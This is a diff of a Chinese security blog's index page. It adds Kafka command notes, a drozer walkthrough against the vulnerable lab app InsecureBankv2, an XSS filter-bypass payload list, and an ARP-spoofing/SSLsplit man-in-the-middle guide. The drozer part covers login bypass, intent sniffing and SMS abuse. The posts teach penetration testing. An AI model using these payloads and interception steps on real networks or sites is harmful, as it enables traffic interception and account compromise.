@@ -161,6 +161,64 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-软件/kafka命令操作" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/01/09/软件/kafka命令操作/">kafka 常用命令</a>
+    </h1>
+  
+
+        <a href="/2017/01/09/软件/kafka命令操作/" class="archive-article-date">
+  	<time datetime="2017-01-09T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-09</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="查看topic"><a href="#查看topic" class="headerlink" title="查看topic"></a>查看topic</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./kafka-topics.sh --zookeeper ip：2181 --list（列出所有topic）</div></pre></td></tr></table></figure>
+<h4 id="控制台接收信息"><a href="#控制台接收信息" class="headerlink" title="控制台接收信息"></a>控制台接收信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bin/kafka-console-consumer.sh --zookeeper  ip：2181  --from-beginning --topic test</div></pre></td></tr></table></figure>
+<h4 id="zookeeper命令"><a href="#zookeeper命令" class="headerlink" title="zookeeper命令"></a>zookeeper命令</h4><blockquote>
+<p>dump：列出未完成的会话和临时节点<br>  envi: 打印有关服务环境的详细信息<br>  reqs：列出未完成的请求<br>  ruok：测试服务器是否运行再非错误状态<br>  stat：列出有关性能和连接的客户端的统计信息</p>
+</blockquote>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/软件/">软件</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/01/09/软件/kafka命令操作/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-移动安全/浅谈android hook技术" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -664,75 +722,103 @@
 
 
   
-    <article id="post-安全测试/中间人攻击获取ssl-tsl数据" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-移动安全/drozer测试InsecureBankv2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/">中间人攻击获取ssl数据</a>
+      <a class="article-title" href="/2016/12/16/移动安全/drozer测试InsecureBankv2/">drozer测试InsecureBankv2</a>
     </h1>
   
 
-        <a href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/" class="archive-article-date">
+        <a href="/2016/12/16/移动安全/drozer测试InsecureBankv2/" class="archive-article-date">
   	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
 </a>
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="数据流量重定向"><a href="#数据流量重定向" class="headerlink" title="数据流量重定向"></a>数据流量重定向</h2><ul>
-<li>使用ARP欺骗。发送假的网关(gateway)的MAC地址（其实是攻击者的MAC地址) 给受害者, 让受害者误以为 攻击者就是网关。你不需要物理访问受害者的设备就能做到。</li>
-<li>手动改变 受害者的 默认网关。如果你能物理访问受害者设备，这是最简单的方法</li>
-<li>DNS欺骗。 对特定的域名，返回攻击者的IP作为目标服务器的地址 给受害者。</li>
-<li>修改受害者机器的/etc/hosts的条目来 转向某些域名的流量</li>
+        <p>测试app包名：com.android.insecurebankv2</p>
+<h3 id="intent-sniffer-数据嗅探"><a href="#intent-sniffer-数据嗅探" class="headerlink" title="intent sniffer(数据嗅探)"></a>intent sniffer(数据嗅探)</h3><ul>
+<li>利用app.broadcast.sniff 模块    </li>
 </ul>
-<h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><ol>
-<li>环境：</li>
-</ol>
+<p>首先apktool获取manifest文件，查看receiver组件，获取触发该组件的intent-filter的action name</p>
+<p>利用run app.broadcast.sniff –action theBroadcast 进行嗅探  </p>
+<p>结果获取到修改的密码信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Broadcast receiver registered to sniff matching intents</div><div class="line">[*] Output is updated once a second. Press Control+C to exit.</div><div class="line">Action: theBroadcast</div><div class="line">Raw: Intent &#123; act=theBroadcast flg=0x10 (has extras) &#125;</div><div class="line">Extra: newpass=Dinesh@123! (java.lang.String)</div><div class="line">Extra: phonenumber=15555215554 (java.lang.String)</div></pre></td></tr></table></figure></p>
 <ul>
-<li>攻击者ip:192.168.31.200 操作主机</li>
-<li>网关：192.168.31.1 路由器</li>
-<li>受害者：192.168.31.224 手机或电脑</li>
+<li>代码层次：</li>
 </ul>
-<ol>
-<li>开启ip转发</li>
-</ol>
-<p><code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</code></p>
-<ol>
-<li>生成CA证书  </li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">openssl genrsa -out ca.key 4096</div><div class="line">openssl req -new -x509 -days 1826 -key ca.key -out ca.crt</div></pre></td></tr></table></figure>
+<p>获取到代码，查看注册recever的名称，这个是接受信息；可搜索sendBroadcast来查找谁发的广播</p>
+<h3 id="登入绕过"><a href="#登入绕过" class="headerlink" title="登入绕过"></a>登入绕过</h3><ul>
+<li><p>可查看manifast文件查找exported=“true”的activity名称</p>
+</li>
+<li><p>可以直接使用drozer activity模块查找暴露出的activity</p>
+</li>
+</ul>
+<p>测试：直接调用com.android.insecurebankv2.PostLogin 绕过登入，直接进入转帐等页面</p>
+<h3 id="备份安全测试"><a href="#备份安全测试" class="headerlink" title="备份安全测试"></a>备份安全测试</h3><ul>
+<li><p>可查看manifast文件查看是否允许备份allowBackup=”true”</p>
+</li>
+<li><p>可利用drozer模块：run app.package.backup -f insecurebankv2查看  </p>
+</li>
+</ul>
+<p>测试：  </p>
+<p>在当前目录下备份，在当前目录下会产生backup.ab 文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb backup -apk-shared com.android.insecurebankv2</div></pre></td></tr></table></figure>
 <ul>
-<li>第1个命令，生成 4096位的RSA私钥（以pem格式保存) ca.key</li>
-<li>第2个命令， 使用这个刚生成的私钥，来生成一个 自签名的 root CA 证书(ca.crt)</li>
+<li>读取该文件，后面可以看到登入账户的所有信息</li>
 </ul>
-<p>这两个文件在后面都会用到。只有ca.crt这个证书文件，需要安装 到浏览器，或者受害者的机器上。</p>
-<ol>
-<li>端口流量转发</li>
-</ol>
-<p>用iptables进行流量转发，需要把我们需要的端口进行转发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat backup.ab | (dd bs=24 count=0 skip=1; cat) | zlib-flate -uncompress &gt; backup_compressed.tar (ab的解压未成功)</div></pre></td></tr></table></figure>
+<h3 id="jdb调试app程序"><a href="#jdb调试app程序" class="headerlink" title="jdb调试app程序"></a>jdb调试app程序</h3><ul>
+<li><p>使用adb jdwp来查看那些app是可以被调试的，再次运行insecurebankv2，运行adb jdwp来查看最新增加的ID，记录（注：也可以直接使用ddms来查看可以被调试的app的pid）</p>
+</li>
+<li><p>使用adb forward tcp:1111 jdwp: pid 将调试端口转发到本地主机端口上</p>
+</li>
+<li><p>使用jdb -attach localhost:1111 链接调试端口，进行调试   </p>
+</li>
+</ul>
+<p>测试：  </p>
+<p>实验中主要是更改变量属性值，app会检查设备的root情况并且输出出来  </p>
+<p>本来为rooted，直接更改为 not rooted  </p>
+<p>可能用到的命令：  </p>
 <blockquote>
-<p>8080用作非SSL的TCP连接，比如 http, smtp, ftp<br>8443 用作SSL的连接，比如SMTP over SSL, HTTPS等</p>
+<p>class：查看所有用到的包名<br>methods：进入到相应的函数中，这里是：methods com.android.insecurebankv2.PostLogin<br>直接在showRootStatus()方法上下断点，jdb主要命令<br>step – 执行当前行<br>step up – 执行到当前方法返回到其调用程序<br>stepi – 执行当前指令<br>next – 跳过一行（跨过调用）<br>cont – 从断点处继续执行  </p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">sysctl -w net.ipv4.ip_forward=1</div><div class="line">iptables -t nat -F</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</div></pre></td></tr></table></figure>
-<ol>
-<li>ARP欺骗</li>
-</ol>
-<p><code>ettercap -T -q -M ARP //192.168.31.224/ //192.168.31.1/</code></p>
-<p><code>arpspoof -i eth0 -t 192.168.31.1 192.168.31.224</code></p>
-<ol>
-<li>直接建立热点</li>
-</ol>
-<p>kali下可以直接建立热点，需要打开iptables的nat功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE #对eth0进行源nat</div><div class="line">iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT #把无线网卡流量转发到有线网卡（或者什么能上网的网卡）上面</div><div class="line">iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356 #修改最大报文段长度</div></pre></td></tr></table></figure></p>
-<ol>
-<li>使用SSLsplit进行</li>
-</ol>
-<p><code>sslsplit -D -l connect.log -j /opt/sslsplit/test1 -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></p>
-<ol>
-<li>使用starttls-mitm进行(<a href="https://github.com/adrain09/starttls-mitm" target="_blank" rel="external">https://github.com/adrain09/starttls-mitm</a>)</li>
-</ol>
+<p>运行过程中，观察locals的本地变量  </p>
+<p>出现变量：isrooted=true，利用set isrooted=false进行变量设置  </p>
+<p>run运行，发现提示变为未root  </p>
+<h3 id="hack-广播接受者-恶意发送短信"><a href="#hack-广播接受者-恶意发送短信" class="headerlink" title="hack 广播接受者,恶意发送短信"></a>hack 广播接受者,恶意发送短信</h3><ul>
+<li>run app.broadcast.info 查看是否有暴露出的receiver，查看manifest文件，观察启动该接受者的action</li>
+</ul>
+<p>在反编译代码中查找该reveicer</p>
+<p>本例中代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">public void onReceive(Context paramContext, Intent paramIntent)</div><div class="line">&#123;</div><div class="line">Object localObject = paramIntent.getStringExtra(&quot;phonenumber&quot;);</div><div class="line">paramIntent = paramIntent.getStringExtra(&quot;newpass&quot;);</div><div class="line">并且在下面调用了 ((SmsManager)localObject).sendTextMessage(paramContext, null, paramIntent, null, null);发送短信</div></pre></td></tr></table></figure>
+<p>触发这个的reveicer的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">private void broadcastChangepasswordSMS(String paramString1, String paramString2)</div><div class="line">&#123;</div><div class="line">if (TextUtils.isEmpty(paramString1.toString().trim()))</div><div class="line">&#123;</div><div class="line">System.out.println(&quot;Phone number Invalid.&quot;);</div><div class="line">return;</div><div class="line">&#125;</div><div class="line">Intent localIntent = new Intent();</div><div class="line">localIntent.setAction(&quot;theBroadcast&quot;);</div><div class="line">localIntent.putExtra(&quot;phonenumber&quot;, paramString1);</div><div class="line">localIntent.putExtra(&quot;newpass&quot;, paramString2);</div><div class="line">sendBroadcast(localIntent);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<ul>
+<li>直接调用am命令：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb shell am broadcast -a theBroadcast -n com.android.insecurebankv2/com.android.insecurebankv2.MyBroadCastReceiver --es phonenumber 15210601846 --es newpass Dinesh@123$ 可以直接启动一个广播</div></pre></td></tr></table></figure>
+<ul>
+<li>可以使用drozer 启动：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run app.broadcast.send --action theBroadcast --component com.android.insecurebankv2 com.android.insecurebankv2.MyBroadCastReceiver --extra string phonenumber 15210601846 --extra string newpass ddddsadsad</div></pre></td></tr></table></figure>
+<h3 id="hack-数据库，provider"><a href="#hack-数据库，provider" class="headerlink" title="hack 数据库，provider"></a>hack 数据库，provider</h3><ul>
+<li><p>drozer里面的命令<code>run scanner.provider.finduris -a com.android.insecurebankv2</code><br>扫描可以利用的provider</p>
+</li>
+<li><p>利用 <code>run app.provider.query</code> 进行查询  </p>
+</li>
+<li><p>在代码中主要是在manifest中查找可以用的provider，再在代码中查看provider的url链接</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb shell content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers 查看</div></pre></td></tr></table></figure>
+<h3 id="攻击复制的数据"><a href="#攻击复制的数据" class="headerlink" title="攻击复制的数据"></a>攻击复制的数据</h3><p><code>adb shell su u0_a51 service call clipboard 2 s16 包名</code></p>
+<h3 id="攻击数据库"><a href="#攻击数据库" class="headerlink" title="攻击数据库"></a>攻击数据库</h3><p>若是数据库没有加密的话，直接pull下来，查看即可</p>
+<h3 id="不安全的log"><a href="#不安全的log" class="headerlink" title="不安全的log"></a>不安全的log</h3><p>直接ddms或者adb logcat读取敏感数据</p>
+<h3 id="导出内存数据（未测试）"><a href="#导出内存数据（未测试）" class="headerlink" title="导出内存数据（未测试）"></a>导出内存数据（未测试）</h3><p>ddms导出hprof ，利用platform-tools 工具：./hprof-conv com.android.insecurebankv2.hprof  SSSSS.hprof格式化，利用app的内存分析工具分析内存。</p>
+<h3 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h3><p>在sharepreferen中可以看到用户名和密码信息，不过都是采用了加密的处理,但是在代码中可以看到采用了硬加密的处理方式,并且有明文的iv和密钥信息，采用的AES的cbc模式加密处理</p>
 
       
 
@@ -743,14 +829,87 @@
       
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全测试/">安全测试</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/移动安全/">移动安全</a></li></ul>
 	</div>
 
       
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/">展开全文 >></a>
+          <a class="article-more-a" href="/2016/12/16/移动安全/drozer测试InsecureBankv2/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-web安全/xss向量" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/12/16/web安全/xss向量/">XSS向量</a>
+    </h1>
+  
+
+        <a href="/2016/12/16/web安全/xss向量/" class="archive-article-date">
+  	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ol>
+<li>css xss向量</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;@import%20url(http://www.xsec.io/static/upload/1.css);%20z-index:9999</div></pre></td></tr></table></figure>
+<ol>
+<li>利用反引号</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html BLAH&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;p onmouseover=alert`2`&gt;2121212&lt;/p&gt;</div><div class="line">&lt;p onmouseover=id=/confir/.source+&apos;m&apos;+&apos;(1)&apos;;onmousedown=eval(id)&gt; 11111&lt;/p&gt;</div><div class="line">&lt;a href=&quot;j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;(&amp;Tab;document.domain&amp;Tab;);//http://www.baidu.com&quot;&gt;点击此处&lt;/a&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<ol>
+<li>利用%2f</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;body%2fonmouseover=alert(1)&gt;&lt;/body&gt;</div></pre></td></tr></table></figure>
+<ol>
+<li><p>利用html实体<br>在href中html实体是可以反解出来的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=javascrpi:&amp;#67lert(1)&gt;xss&lt;/a&gt;</div></pre></td></tr></table></figure>
+</li>
+<li><p>其他：</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&quot;onmouseover=%0A&quot;confirm(1)</div><div class="line"></div><div class="line">/* HTML5 based entities were doing good in bypassing data URI RE */</div><div class="line"></div><div class="line">&lt;a href=&apos;data&amp;colon;text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&apos;&gt;click&lt;/a&gt;</div><div class="line">&lt;a href=&apos;data:application/x-x509-user-cert;&amp;NewLine;base64&amp;NewLine;, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&apos;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* Both are Firefox specific payloads */ /* The RE initially thinks that base64 keyword is necessary. */</div><div class="line"></div><div class="line">&lt;a href=&quot;data:x,% 3 c script % 3 e alert(1) % 3 c/script %3 e&quot;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* The RE thinks that only alphanumeric characters are allowed after data URI */</div><div class="line"></div><div class="line">&lt;a href=&quot;data:@[&apos;&#123;§(`__`)$&#125;&apos;]@, % 3 c script % 3 e alert(1) % 3 c/script %3 e&quot;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* The first two payloads bypasses the check on word expression with the help of \ */</div><div class="line"></div><div class="line">&lt;div style=&quot;x:e\x\p\r\ession(alert(1))&quot;&gt;div&lt;/div&gt;</div><div class="line">&lt;p style=&apos;\x:\65xpre\73sio\6e(alert(1))&apos;&gt;hello barracuda&lt;/p&gt;</div><div class="line"></div><div class="line">/* The regular expression was expecting ( after the keyword expression */</div><div class="line"></div><div class="line">&lt;div style=&quot;width:expression\28 alert \28 1\29 \29&quot;&gt;I will bypass you&lt;/div&gt;</div><div class="line"></div><div class="line">/* Decimal Encoding without the presence of ; bypasses the regular expression */</div><div class="line"></div><div class="line">&lt;div style=&quot;width&amp;#58expression&amp;#40alert&amp;#40 1&amp;#41&amp;#41&quot;&gt;I will not match&lt;/div&gt;</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2016/12/16/web安全/xss向量/">展开全文 >></a>
         </p>
       
 
@@ -934,132 +1093,75 @@
 
 
   
-    <article id="post-web安全/xss向量" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-安全测试/中间人攻击获取ssl-tsl数据" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/16/web安全/xss向量/">XSS向量</a>
+      <a class="article-title" href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/">中间人攻击获取ssl数据</a>
     </h1>
   
 
-        <a href="/2016/12/16/web安全/xss向量/" class="archive-article-date">
+        <a href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/" class="archive-article-date">
   	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
 </a>
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <ol>
-<li>css xss向量</li>
+        <h2 id="数据流量重定向"><a href="#数据流量重定向" class="headerlink" title="数据流量重定向"></a>数据流量重定向</h2><ul>
+<li>使用ARP欺骗。发送假的网关(gateway)的MAC地址（其实是攻击者的MAC地址) 给受害者, 让受害者误以为 攻击者就是网关。你不需要物理访问受害者的设备就能做到。</li>
+<li>手动改变 受害者的 默认网关。如果你能物理访问受害者设备，这是最简单的方法</li>
+<li>DNS欺骗。 对特定的域名，返回攻击者的IP作为目标服务器的地址 给受害者。</li>
+<li>修改受害者机器的/etc/hosts的条目来 转向某些域名的流量</li>
+</ul>
+<h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><ol>
+<li>环境：</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;style&gt;@import%20url(http://www.xsec.io/static/upload/1.css);%20z-index:9999</div></pre></td></tr></table></figure>
+<ul>
+<li>攻击者ip:192.168.31.200 操作主机</li>
+<li>网关：192.168.31.1 路由器</li>
+<li>受害者：192.168.31.224 手机或电脑</li>
+</ul>
 <ol>
-<li>利用反引号</li>
+<li>开启ip转发</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html BLAH&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;p onmouseover=alert`2`&gt;2121212&lt;/p&gt;</div><div class="line">&lt;p onmouseover=id=/confir/.source+&apos;m&apos;+&apos;(1)&apos;;onmousedown=eval(id)&gt; 11111&lt;/p&gt;</div><div class="line">&lt;a href=&quot;j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;(&amp;Tab;document.domain&amp;Tab;);//http://www.baidu.com&quot;&gt;点击此处&lt;/a&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<p><code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</code></p>
 <ol>
-<li>利用%2f</li>
+<li>生成CA证书  </li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;body%2fonmouseover=alert(1)&gt;&lt;/body&gt;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">openssl genrsa -out ca.key 4096</div><div class="line">openssl req -new -x509 -days 1826 -key ca.key -out ca.crt</div></pre></td></tr></table></figure>
+<ul>
+<li>第1个命令，生成 4096位的RSA私钥（以pem格式保存) ca.key</li>
+<li>第2个命令， 使用这个刚生成的私钥，来生成一个 自签名的 root CA 证书(ca.crt)</li>
+</ul>
+<p>这两个文件在后面都会用到。只有ca.crt这个证书文件，需要安装 到浏览器，或者受害者的机器上。</p>
 <ol>
-<li><p>利用html实体<br>在href中html实体是可以反解出来的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=javascrpi:&amp;#67lert(1)&gt;xss&lt;/a&gt;</div></pre></td></tr></table></figure>
-</li>
-<li><p>其他：</p>
-</li>
+<li>端口流量转发</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&quot;onmouseover=%0A&quot;confirm(1)</div><div class="line"></div><div class="line">/* HTML5 based entities were doing good in bypassing data URI RE */</div><div class="line"></div><div class="line">&lt;a href=&apos;data&amp;colon;text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&apos;&gt;click&lt;/a&gt;</div><div class="line">&lt;a href=&apos;data:application/x-x509-user-cert;&amp;NewLine;base64&amp;NewLine;, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&apos;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* Both are Firefox specific payloads */ /* The RE initially thinks that base64 keyword is necessary. */</div><div class="line"></div><div class="line">&lt;a href=&quot;data:x,% 3 c script % 3 e alert(1) % 3 c/script %3 e&quot;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* The RE thinks that only alphanumeric characters are allowed after data URI */</div><div class="line"></div><div class="line">&lt;a href=&quot;data:@[&apos;&#123;§(`__`)$&#125;&apos;]@, % 3 c script % 3 e alert(1) % 3 c/script %3 e&quot;&gt;click&lt;/a&gt;</div><div class="line"></div><div class="line">/* The first two payloads bypasses the check on word expression with the help of \ */</div><div class="line"></div><div class="line">&lt;div style=&quot;x:e\x\p\r\ession(alert(1))&quot;&gt;div&lt;/div&gt;</div><div class="line">&lt;p style=&apos;\x:\65xpre\73sio\6e(alert(1))&apos;&gt;hello barracuda&lt;/p&gt;</div><div class="line"></div><div class="line">/* The regular expression was expecting ( after the keyword expression */</div><div class="line"></div><div class="line">&lt;div style=&quot;width:expression\28 alert \28 1\29 \29&quot;&gt;I will bypass you&lt;/div&gt;</div><div class="line"></div><div class="line">/* Decimal Encoding without the presence of ; bypasses the regular expression */</div><div class="line"></div><div class="line">&lt;div style=&quot;width&amp;#58expression&amp;#40alert&amp;#40 1&amp;#41&amp;#41&quot;&gt;I will not match&lt;/div&gt;</div></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2016/12/16/web安全/xss向量/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-安全测试/brupsuite/基于burp插件的安全测试" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/16/安全测试/brupsuite/基于burp插件的安全测试/">基于burp插件的安全测试</a>
-    </h1>
-  
-
